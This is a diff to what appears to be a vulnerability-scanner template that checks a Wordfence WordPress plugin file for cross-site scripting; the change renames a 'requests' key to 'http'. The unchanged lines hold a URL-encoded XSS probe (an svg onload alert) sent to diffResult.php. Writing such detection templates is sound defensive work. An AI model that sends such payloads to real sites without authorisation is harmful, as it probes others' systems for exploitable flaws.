@@ -6,7 +6,7 @@ info:
   severity: medium
   tags: wordpress-misc,wordpress,wp-plugin,xss
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/wp-content/plugins/wordfence/lib/diffResult.php?file=%22%3E%3Csvg%2Fonload%3Dalert(1337)%3E"
